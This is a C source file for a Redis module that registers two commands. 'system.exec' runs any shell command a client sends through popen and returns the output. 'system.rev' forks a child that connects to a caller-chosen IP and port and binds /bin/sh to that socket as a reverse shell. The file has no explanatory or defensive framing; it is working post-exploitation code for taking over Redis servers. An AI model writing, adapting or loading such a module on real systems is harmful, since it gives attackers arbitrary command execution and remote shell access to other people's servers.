#include "redismodule.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);

    size_t cmd_len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

    FILE *fp = popen(cmd, "r");
    if (!fp) return RedisModule_ReplyWithError(ctx, "ERR_POPEN_FAILED");

    size_t capacity = 4096;
    char *output = calloc(1, capacity);
    char buf[1024];

    if (!output) {
        pclose(fp);
        return RedisModule_ReplyWithError(ctx, "ERR_OUT_OF_MEMORY");
    }

    while (fgets(buf, sizeof(buf), fp) != NULL) {
        size_t needed = strlen(output) + strlen(buf) + 1;
        if (needed >= capacity) {
            capacity *= 2;
            char *new_output = realloc(output, capacity);
            if (!new_output) {
                free(output);
                pclose(fp);
                return RedisModule_ReplyWithError(ctx, "ERR_REALLOC_FAILED");
            }
            output = new_output;
        }
        strcat(output, buf);
    }

    RedisModule_ReplyWithSimpleString(ctx, output);

    free(output);
    pclose(fp);
    return REDISMODULE_OK;
}

int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) return RedisModule_WrongArity(ctx);

    size_t ip_len, port_len;
    const char *ip = RedisModule_StringPtrLen(argv[1], &ip_len);
    const char *port_s = RedisModule_StringPtrLen(argv[2], &port_len);
    int port = atoi(port_s);

    // Fork so the main Redis process doesn't hang or exit
    pid_t pid = fork();
    if (pid < 0) return RedisModule_ReplyWithError(ctx, "ERR_FORK_FAILED");
    
    if (pid == 0) { // Child process
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);
        sa.sin_port = htons(port);

        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
            dup2(s, 0); dup2(s, 1); dup2(s, 2);
            execl("/bin/sh", "sh", NULL);
        }
        _exit(1); // Exit child if exec fails
    }

    return RedisModule_ReplyWithSimpleString(ctx, "Background process started");
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec", DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.rev", RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
